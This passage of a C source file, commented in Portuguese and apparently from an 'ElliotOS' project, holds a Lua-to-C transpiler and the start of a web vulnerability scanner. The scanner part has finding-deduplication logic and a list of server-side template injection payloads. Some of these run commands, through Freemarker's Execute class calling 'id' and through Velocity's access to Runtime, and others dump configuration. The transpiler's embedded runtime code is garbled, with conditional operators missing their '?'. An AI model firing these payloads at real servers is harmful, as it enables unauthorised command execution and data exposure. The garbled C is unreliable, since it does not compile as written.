    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <string.h>\n"
    "#include <assert.h>\n";

static const char *L2C_RUNTIME_STRBUF =
    "static char   _l2c_sb[64][1024];\n"
    "static int    _l2c_si = 0;\n"
    "#define _l2c_next_buf() (_l2c_sb[(_l2c_si++)&63])\n"
    "\n"
    "/* _l2c_cat(n, s1, s2, ...) -> concatena n strings */\n"
    "static const char *_l2c_cat(int n, ...) {\n"
    "    char *buf = _l2c_next_buf();\n"
    "    buf[0] = '\\0';\n"
    "    va_list ap; va_start(ap, n);\n"
    "    for(int _i = 0; _i < n; _i++) {\n"
    "        const char *s = va_arg(ap, const char*);\n"
    "        if(s) strncat(buf, s, 1023 - strlen(buf));\n"
    "    }\n"
    "    va_end(ap);\n"
    "    return buf;\n"
    "}\n"
    "static const char *_l2c_tostr(double v) {\n"
    "    char *buf = _l2c_next_buf();\n"
    "    if((double)(long long)v == v) snprintf(buf,1024,\"%lld\",(long long)v);\n"
    "    else snprintf(buf,1024,\"%g\",v);\n"
    "    return buf;\n"
    "}\n"
    "static const char *_l2c_type(double v){(void)v;return \"number\";}\n"
    "static const char *_l2c_mathtype(double v){\n"
    "    return ((double)(long long)v==v)\"integer\":\"float\";\n"
    "}\n";

static const char *L2C_RUNTIME_STRING =
    "static const char *_l2c_upper(const char *s){\n"
    "    char *buf=_l2c_next_buf(); int j=0;\n"
    "    for(;s&&*s&&j<1023;s++,j++) buf[j]=(char)toupper((unsigned char)*s);\n"
    "    buf[j]='\\0'; return buf;\n"
    "}\n"
    "static const char *_l2c_lower(const char *s){\n"
    "    char *buf=_l2c_next_buf(); int j=0;\n"
    "    for(;s&&*s&&j<1023;s++,j++) buf[j]=(char)tolower((unsigned char)*s);\n"
    "    buf[j]='\\0'; return buf;\n"
    "}\n"
    "static const char *_l2c_rep(const char *s,int n){\n"
    "    char *buf=_l2c_next_buf(); int j=0,sl=s(int)strlen(s):0;\n"
    "    for(int k=0;k<n&&j+sl<1023;k++){memcpy(buf+j,s,sl);j+=sl;}\n"
    "    buf[j]='\\0'; return buf;\n"
    "}\n"
    "static const char *_l2c_rev(const char *s){\n"
    "    char *buf=_l2c_next_buf(); int n=s(int)strlen(s):0;\n"
    "    for(int j=0;j<n;j++) buf[j]=s[n-1-j];\n"
    "    buf[n]='\\0'; return buf;\n"
    "}\n"
    "static const char *_l2c_char(int c){\n"
    "    char *buf=_l2c_next_buf();\n"
    "    buf[0]=(char)c; buf[1]='\\0'; return buf;\n"
    "}\n"
    "static const char *_l2c_sub(const char *s,int i,int j){\n"
    "    char *buf=_l2c_next_buf(); int n=s(int)strlen(s):0;\n"
    "    if(i<0)i=n+i+1; if(j<0)j=n+j+1;\n"
    "    if(i<1)i=1; if(j>n)j=n;\n"
    "    int len=j-i+1; if(len<0)len=0; if(len>1023)len=1023;\n"
    "    if(s&&len>0) memcpy(buf,s+i-1,len);\n"
    "    buf[len]='\\0'; return buf;\n"
    "}\n"
    "static int _l2c_find(const char *s,const char *pat){\n"
    "    if(!s||!pat) return -1;\n"
    "    const char *f=strstr(s,pat); return f(int)(f-s)+1:-1;\n"
    "}\n"
    "static const char *_l2c_match(const char *s,const char *pat){\n"
    "    (void)pat;\n"
    "    char *buf=_l2c_next_buf();\n"
    "    /* simplificado: retorna s se pat encontrado */\n"
    "    const char *f=sstrstr(s,pat):NULL;\n"
    "    if(f){ int n=(int)strlen(f); if(n>1023)n=1023; memcpy(buf,f,n); buf[n]='\\0';}\n"
    "    else buf[0]='\\0';\n"
    "    return buf;\n"
    "}\n"
    "static const char *_l2c_gsub(const char *s,const char *pat,const char *rep){\n"
    "    char *buf=_l2c_next_buf(); int bi=0;\n"
    "    int pl=pat(int)strlen(pat):0;\n"
    "    int rl=rep(int)strlen(rep):0;\n"
    "    while(s&&*s&&bi<1022){\n"
    "        const char *f=plstrstr(s,pat):NULL;\n"
    "        if(!f){int n=(int)strlen(s);if(n>1022-bi)n=1022-bi;memcpy(buf+bi,s,n);bi+=n;break;}\n"
    "        int pre=(int)(f-s); if(pre>1022-bi)pre=1022-bi;\n"
    "        memcpy(buf+bi,s,pre); bi+=pre;\n"
    "        if(rl>0&&bi+rl<1023){memcpy(buf+bi,rep,rl);bi+=rl;}\n"
    "        s=f+pl;\n"
    "    }\n"
    "    buf[bi]='\\0'; return buf;\n"
    "}\n"
    "static const char *_l2c_tblcat(const double *t,int n,const char *sep){\n"
    "    char *buf=_l2c_next_buf(); buf[0]='\\0';\n"
    "    int sl=sep(int)strlen(sep):0;\n"
    "    for(int i=0;i<n;i++){\n"
    "        char tmp[64]; snprintf(tmp,64,\"%g\",t[i]);\n"
    "        strncat(buf,tmp,1023-strlen(buf));\n"
    "        if(i<n-1&&sl>0) strncat(buf,sep,1023-strlen(buf));\n"
    "    }\n"
    "    return buf;\n"
    "}\n";

static const char *L2C_RUNTIME_FMT =
    "#include <stdarg.h>\n"
    "static const char *_l2c_fmt(const char *fmt,...){\n"
    "    char *buf=_l2c_next_buf();\n"
    "    va_list ap; va_start(ap,fmt);\n"
    "    vsnprintf(buf,1024,fmt,ap); va_end(ap);\n"
    "    return buf;\n"
    "}\n";

/* ============================================================================
 * SECTION 8 -- Ponto de entrada: l_cc_lua2c
 * ============================================================================ */
static int l_cc_lua2c(lua_State *L) {
    const char *lua_code = luaL_checkstring(L, 1);

    /* -- buffers de saida -- */
    L2CBuf fwddecl, helpers, body;
    l2c_buf_init(&fwddecl);
    l2c_buf_init(&helpers);
    l2c_buf_init(&body);

    /* -- estado do emitter -- */
    L2CEmit em; memset(&em,0,sizeof(em));
    em.out      = &body;
    em.helpers  = &helpers;
    em.fwddecl  = &fwddecl;
    l2c_st_init(&em.st);

    /* -- lexer -- */
    L2CLex lx; l2c_lex_init(&lx, lua_code);

    /* -- pre-scan: detecta se ha funcoes top-level -- */
    int has_toplevel_func = 0;
    {
        L2CLex lx2; l2c_lex_init(&lx2, lua_code);
        int dep=0;
        for(;;){
            L2CTok tk; l2c_lex_next_raw(&lx2,&tk);
            if(tk.kind==TK_EOF) break;
            if(tk.kind==TK_FUNCTION&&dep==0){ has_toplevel_func=1; }
            if(tk.kind==TK_FUNCTION||tk.kind==TK_IF||tk.kind==TK_WHILE||
               tk.kind==TK_FOR||tk.kind==TK_REPEAT||tk.kind==TK_DO) dep++;
            else if(tk.kind==TK_END&&dep>0) dep--;
        }
    }

    if(!has_toplevel_func){
        em.depth=1;
        l2c_buf_add(&body,"int main(void) {\n");
    }

    /* -- transpilacao principal -- */
    l2c_emit_block(&lx,&em,TK_EOF,TK_EOF,TK_EOF);

    if(em.had_error){
        l2c_buf_free(&fwddecl); l2c_buf_free(&helpers); l2c_buf_free(&body);
        l2c_st_free(&em.st);
        lua_pushnil(L); lua_pushstring(L,em.errbuf); return 2;
    }

    if(!has_toplevel_func){
        l2c_buf_add(&body,"    return 0;\n}\n");
    }

    /* -- monta saida final -- */
    L2CBuf out; l2c_buf_init(&out);
    l2c_buf_add(&out,"/* Gerado por cc.lua2c -- ElliotOS v19.0 (professional transpiler) */\n");
    l2c_buf_add(&out, L2C_RUNTIME_ALWAYS);
    if(em.need_math)  l2c_buf_add(&out,"#include <math.h>\n");
    if(em.need_time)  l2c_buf_add(&out,"#include <time.h>\n");
    if(em.need_ctype) l2c_buf_add(&out,"#include <ctype.h>\n");
    l2c_buf_addc(&out,'\n');

    /* strbuf runtime */
    if(em.need_strbuf){
        l2c_buf_add(&out,"#include <stdarg.h>\n");
        l2c_buf_add(&out, L2C_RUNTIME_STRBUF);
        if(em.need_ctype) l2c_buf_add(&out, L2C_RUNTIME_STRING);
        if(em.need_stdarg) l2c_buf_add(&out, L2C_RUNTIME_FMT);
    } else if(em.need_stdarg){
        l2c_buf_add(&out,"#include <stdarg.h>\n");
        l2c_buf_add(&out, L2C_RUNTIME_FMT);
    }
    /* _l2c_cat sempre precisa de stdarg se strbuf ativo */
    if(em.need_strbuf&&!em.need_stdarg){
        l2c_buf_add(&out,"#include <stdarg.h>\n");
    }

    /* forward decls */
    if(fwddecl.buf&&fwddecl.buf[0]){
        l2c_buf_addc(&out,'\n');
        l2c_buf_add(&out,fwddecl.buf);
    }

    l2c_buf_addc(&out,'\n');
    l2c_buf_add(&out, body.buf?body.buf:"");

    l2c_buf_free(&fwddecl);
    l2c_buf_free(&helpers);
    l2c_buf_free(&body);
    l2c_st_free(&em.st);

    lua_pushstring(L, out.buf?out.buf:"");
    l2c_buf_free(&out);
    return 1;
}

// MOD — pentest scanners
// IMPORTANTE: target e payload são copiados por valor para evitar
// dangling pointers quando a thread acessa após o Lua GC rodar
typedef struct {
    char   payload[512];
    char   target[1024];
    int    timeout;
    size_t baseline_len;  /* tamanho da resposta baseline (0 = não calculado) */
    int    waf_type;      /* WafType — 0=nenhum; workers randomizam UA se >0 */
} test_arg_t;

// ── Carrega payloads de um arquivo .txt (um por linha) ───────────────────────
// Retorna array alocado dinamicamente + count. Caller faz free(arr[i]) e free(arr).
// Se arquivo não existe ou vazio, retorna NULL e count=0.
static char **load_payloads_file(const char *path, int *out_count) {
    *out_count = 0;
    FILE *f = fopen(path, "r");
    if(!f) return NULL;

    // Conta linhas primeiro
    int lines = 0;
    char tmp[1024];
    while(fgets(tmp, sizeof(tmp), f)) {
        // Ignora linhas vazias e comentários (#)
        char *s = tmp;
        while(*s == ' ' || *s == '\t') s++;
        if(*s == '\n' || *s == '\r' || *s == '#' || *s == '\0') continue;
        lines++;
    }
    if(lines == 0) { fclose(f); return NULL; }

    char **arr = (char**)malloc(sizeof(char*) * lines);
    if(!arr) { fclose(f); return NULL; }

    rewind(f);
    int idx = 0;
    while(fgets(tmp, sizeof(tmp), f) && idx < lines) {
        char *s = tmp;
        while(*s == ' ' || *s == '\t') s++;
        if(*s == '\n' || *s == '\r' || *s == '#' || *s == '\0') continue;
        // Remove \n e \r do final
        int len = strlen(s);
        while(len > 0 && (s[len-1] == '\n' || s[len-1] == '\r')) s[--len] = '\0';
        if(len == 0) continue;
        arr[idx] = (char*)malloc(len + 1);
        if(arr[idx]) { memcpy(arr[idx], s, len + 1); idx++; }
    }
    fclose(f);
    *out_count = idx;
    return arr;
}

static void free_payloads(char **arr, int count) {
    if(!arr) return;
    for(int i = 0; i < count; i++) free(arr[i]);
    free(arr);
}

/* ══════════════════════════════════════════════════════════════════════════
 * SISTEMA DE EVIDÊNCIAS — nível Burp Suite
 *
 * Regra fundamental: NUNCA registrar vulnerabilidade com 1 sinal sozinho.
 * Cada finding precisa de pelo menos 2 evidências independentes.
 *
 * DEDUPLICAÇÃO: por (tipo, target_base) — não por payload.
 * Se XSS é confirmado em /search?q=, não registra mais XSS no mesmo endpoint.
 * Isso evita centenas de linhas para a mesma vulnerabilidade.
 * ══════════════════════════════════════════════════════════════════════════ */

#define VULN_MAX 128  /* máx de vulns únicas por scan */

typedef struct {
    char type[16];      /* "XSS","SQLi","RCE","LFI","SSRF","SSTI" */
    char endpoint[512]; /* target sem o valor do parâmetro — normalizado */
    char payload[256];  /* payload que confirmou */
    char evidence[256]; /* descrição das evidências */
    int  confidence;    /* 1=suspeito 2=provável 3=confirmado */
    int  score;         /* 0-100 */
} VulnFinding;

static VulnFinding g_vulns[VULN_MAX];
static atomic_int  g_vuln_count = 0;       /* endpoints únicos vulneráveis */
static atomic_int  g_payload_hits = 0;     /* total de payloads confirmados */
static atomic_int  g_found_count = 0;      /* compatibilidade com MOD_SUMMARY */
static char g_found_payloads[64][512];
static atomic_int g_found_idx = 0;
static pthread_mutex_t g_vuln_mu = PTHREAD_MUTEX_INITIALIZER;

/* Extrai o endpoint base de uma URL (sem o valor do último parâmetro) */
static void vuln_normalize_endpoint(const char *target, char *out, size_t outsz) {
    strncpy(out, target, outsz-1);
    /* Remove valor após último '=' */
    char *eq = strrchr(out, '=');
    if(eq) *(eq+1) = '\0';
    /* Remove query string completamente se não tem '=' */
    char *qm = strchr(out, '?');
    if(qm && !strchr(qm,'=')) *qm = '\0';
}

/* Registra vulnerabilidade com deduplicação por (tipo, endpoint).
 * Retorna 1 se registrado, 0 se duplicata. */
static int vuln_register(const char *type, const char *target,
                         const char *payload, const char *evidence,
                         int confidence, int score) {
    char endpoint[512]={0};
    vuln_normalize_endpoint(target, endpoint, sizeof(endpoint));

    pthread_mutex_lock(&g_vuln_mu);

    /* Verifica duplicata */
    int count = (int)atomic_load(&g_vuln_count);
    for(int i=0; i<count; i++){
        if(strcmp(g_vulns[i].type, type)==0 &&
           strcmp(g_vulns[i].endpoint, endpoint)==0) {
            /* Já registrado — atualiza se nova evidência tem score maior */
            if(score > g_vulns[i].score){
                g_vulns[i].score = score;
                g_vulns[i].confidence = confidence;
                strncpy(g_vulns[i].evidence, evidence, 255);
                strncpy(g_vulns[i].payload, payload, 255);
            }
            pthread_mutex_unlock(&g_vuln_mu);
            /* conta payload mesmo sendo duplicata de endpoint */
            atomic_fetch_add(&g_payload_hits, 1);
            return 0; /* duplicata de endpoint */
        }
    }

    /* Nova vulnerabilidade (endpoint único) */
    if(count < VULN_MAX){
        strncpy(g_vulns[count].type,     type,     15);
        strncpy(g_vulns[count].endpoint, endpoint, 511);
        strncpy(g_vulns[count].payload,  payload,  255);
        strncpy(g_vulns[count].evidence, evidence, 255);
        g_vulns[count].confidence = confidence;
        g_vulns[count].score      = score;
        atomic_fetch_add(&g_vuln_count, 1);

        /* contador legado */
        int idx = atomic_fetch_add(&g_found_idx, 1);
        if(idx < 64) strncpy(g_found_payloads[idx], payload, 511);
        atomic_fetch_add(&g_found_count, 1);
    }
    pthread_mutex_unlock(&g_vuln_mu);

    /* conta payload */
    atomic_fetch_add(&g_payload_hits, 1);

    /* Log em arquivo */
    elliot_log(type, target, evidence);

    return 1; /* novo endpoint */
}

/* Compatibilidade: found_register agora usa vuln_register genérico
 * chamado pelos workers com tipo já definido no contexto */
static void found_register(const char *payload) {
    /* Chamado pelos workers antigos — incrementa apenas o contador legado */
    int idx = atomic_fetch_add(&g_found_idx, 1);
    if(idx < 64) strncpy(g_found_payloads[idx], payload, 511);
    atomic_fetch_add(&g_found_count, 1);
}

#define MOD_SUMMARY(scan_name, total_payloads) do { \
    int _fc = (int)atomic_load(&g_vuln_count); \
    int _fc_old = (int)atomic_load(&g_found_count); \
    printf("\n\033[1m┌─────────────────────────────────────────────┐\033[0m\n"); \
    printf("\033[1m│  %-44s│\033[0m\n", scan_name); \
    printf("\033[1m│  Payloads testados : %-24d│\033[0m\n", total_payloads); \
    if(_fc > 0) { \
        printf("\033[1;31m│  ❌ VULNERÁVEL — %d endpoint(s) únicos%-6s│\033[0m\n", _fc, ""); \
        for(int _i=0; _i<_fc && _i<5; _i++) { \
            const char *_conf_s = g_vulns[_i].confidence>=3?"CONFIRMADO": \
                                  g_vulns[_i].confidence>=2?"PROVÁVEL":"SUSPEITO"; \
            printf("\033[1;31m│  [%s] %-38.38s│\033[0m\n", _conf_s, g_vulns[_i].endpoint); \
            printf("\033[1;31m│    ↳ %-43.43s│\033[0m\n", g_vulns[_i].evidence); \
        } \
        if(_fc > 5) printf("\033[1;31m│    + %d endpoint(s) adicionais%-14s│\033[0m\n", _fc-5, ""); \
    } else { \
        printf("\033[1;32m│  ✅ SEM VULNERABILIDADE DETECTADA           │\033[0m\n"); \
    } \
    printf("\033[1m└─────────────────────────────────────────────┘\033[0m\n\n"); \
    /* Sincroniza contadores legados para que o retorno da função seja correto */ \
    if(_fc > _fc_old) atomic_store(&g_found_count, _fc); \
} while(0)

// Reinicia o contador antes de cada scan
#define MOD_RESET() do { \
    atomic_store(&g_found_count, 0); \
    atomic_store(&g_found_idx, 0); \
    atomic_store(&g_vuln_count, 0); \
    atomic_store(&g_payload_hits, 0); \
    memset(g_found_payloads, 0, sizeof(g_found_payloads)); \
    memset(g_vulns, 0, sizeof(g_vulns)); \
} while(0)



// Buffer reutilizável para os workers (cada thread tem o seu via test_arg_t)
typedef struct { char *buf; size_t len; size_t cap; } WorkBuf;

static size_t worker_write_cb(void *data, size_t sz, size_t nmemb, void *userp) {
    WorkBuf *wb = (WorkBuf*)userp;
    size_t total = sz * nmemb;
    if(wb->len + total + 1 > wb->cap) {
        /* Crescimento exponencial (dobra o cap) — reduz realocações de O(N) para O(log N) */
        size_t newcap = wb->cap * 2;
        if (newcap < wb->len + total + 1) newcap = wb->len + total + 65536;
        char *tmp = realloc(wb->buf, newcap);
        if(!tmp) return 0;
        wb->buf = tmp; wb->cap = newcap;
    }
    memcpy(wb->buf + wb->len, data, total);
    wb->len += total;
    wb->buf[wb->len] = '\0';
    return total;
}

// Busca case-insensitive em buffer binário — otimizada com memchr no primeiro char
static int buf_icontains(const char *hay, size_t hlen, const char *needle) {
    size_t nlen = strlen(needle);
    if(nlen == 0 || hlen < nlen) return 0;
    unsigned char first_lo = (unsigned char)tolower((unsigned char)needle[0]);
    unsigned char first_up = (unsigned char)toupper((unsigned char)needle[0]);
    const char *p = hay;
    const char *end = hay + hlen - nlen;
    while(p <= end) {
        /* pula até encontrar o primeiro char (lower ou upper) */
        unsigned char c = (unsigned char)*p;
        if(c != first_lo && c != first_up) { p++; continue; }
        /* verifica o resto */
        size_t j = 1;
        while(j < nlen && tolower((unsigned char)p[j]) == tolower((unsigned char)needle[j])) j++;
        if(j == nlen) return 1;
        p++;
    }
    return 0;
}

/* ── SSTI worker — detects template injection via math expression evaluation ── */
/* Payloads designed so successful SSTI returns a calculable numeric result */
/* ─── SSTI payloads v3 ─────────────────────────────────────────────────────
 * Organizado por estratégia:
 *   [POLY]  polyglot — detecção agnóstica de engine
 *   [J2]    Jinja2 / Mako / Flask   (Python)
 *   [TW]    Twig                    (PHP)
 *   [FM]    Freemarker              (Java)
 *   [VL]    Velocity                (Java)
 *   [SM]    Smarty                  (PHP)
 *   [ERB]   ERB                     (Ruby)
 *   [EJS]   EJS / Pug               (Node.js)
 *   [TH]    Thymeleaf / Spring EL   (Java)
 *   [GO]    Go templates
 *   [BLIND] time-based blind SSTI
 *
 * Cada payload usa marcadores matemáticos: resultado esperado = 49 ou 7777777.
 * O worker detecta "49" ou "7777777" na resposta (confirmação por math).
 * ─────────────────────────────────────────────────────────────────────────── */
#define SSTI_PAYLOADS_COUNT 68
static const char *ssti_payloads[] = {
    /* ── [POLY] polyglots — testam múltiplas engines ao mesmo tempo ── */
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "${7*7}T(java.lang.Runtime)",
    "${{7*7}}",
    "{{7*7}}${7*7}<%=7*7%>#{7*7}",
    "\\${{<%[%'\"}}%\\",
    /* ── [J2] Jinja2 / Flask / Mako (Python) ─────────────────────── */
    "{{7*7}}",
    "{{7*'7'}}",                            /* → 7777777 = Jinja2 (não Twig) */
    "{{7+7}}",
    "{{config}}",                           /* Flask: dumps config dict */
    "{{self}}",
    "{{request}}",
    "{{lipsum.__globals__}}",
    "{{''.__class__}}",
    "{{'a'*49}}",
    "{{range(49)|list|length}}",
    "{{namespace.__init__.__globals__}}",
    "{{7|pow(2)}}",
    /* ── [TW] Twig (PHP) ──────────────────────────────────────────── */
    "{{7*7}}",
    "{{7*'7'}}",                            /* → 49 = Twig (não Jinja2) */
    "{{dump(app)}}",
    "{{app.request.server.all|join(',')}}",
    "{{'a'~'b'}}",                          /* concatenação Twig */
    "{{_self}}",
    "{{_self.env}}",
    /* ── [FM] Freemarker (Java) ───────────────────────────────────── */
    "${7*7}",
    "${\"freemarker.template.utility.Execute\"?new()('id')}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "${class.getClass()}",
    "freemarker${'${7*7}'}",
    /* ── [VL] Velocity (Java) ─────────────────────────────────────── */
    "#set($x=7*7)$x",
    "#set($str=$class.inspect(\"java.lang.String\").type)$str",
    "#set($x=7)#set($y=7)#set($z=$x*$y)$z",
    "$class.inspect(\"java.lang.Runtime\").type.getRuntime()",
    /* ── [SM] Smarty (PHP) ────────────────────────────────────────── */
    "{$smarty.version}",
    "{php}echo 49;{/php}",
